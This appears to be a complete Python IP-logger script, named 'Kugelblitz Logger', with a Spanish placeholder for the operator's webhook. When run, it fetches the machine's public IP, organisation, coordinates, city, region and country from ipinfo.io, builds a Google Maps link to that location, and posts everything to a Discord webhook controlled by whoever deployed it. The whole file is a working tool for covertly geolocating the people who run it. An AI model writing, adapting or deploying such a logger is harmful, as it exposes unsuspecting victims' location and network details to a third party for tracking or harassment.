
import dhooks
from dhooks import Webhook, Embed
from json import loads, dumps
import json
from urllib.request import Request, urlopen

WEBHOOK_URL = "tu webhook aqui"


def ip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = (urlopen(url))
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap


ip,org,loc,city,country,region,googlemap = ip()
embed = Embed (
    title = f'{ip, region, country, city,   googlemap}'
)


wb = dhooks.Webhook(WEBHOOK_URL)
wb.modify(name='Kugelblitz Logger')
wb.send(embed=embed)



